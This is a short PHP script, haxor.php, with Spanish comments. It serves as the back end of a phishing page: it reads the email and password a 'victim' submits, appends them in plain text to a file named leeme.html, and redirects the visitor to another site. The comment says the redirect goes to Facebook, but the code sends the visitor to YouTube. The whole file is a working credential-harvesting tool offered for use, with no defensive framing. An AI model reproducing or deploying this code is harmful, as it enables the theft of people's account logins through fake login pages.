<?
/*
Este archivo es el que procesa todos los datos de la victima y lo guarda en un archivo (leeme.html <- Aqui se guardaran los datos).
*/

#haxor.php
// Asigna el valor a las variables del usuario y contraseña
$email = $_POST['email'];
$pass = $_POST['pass'];
//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
	"email: ".$email.

"\npass: ".$pass." ");

fclose($guardame);
//Redirecciona a la web original (facebook)
echo "<meta http-equiv='refresh' content='1;url=https://www.youtube.com'>"
?>
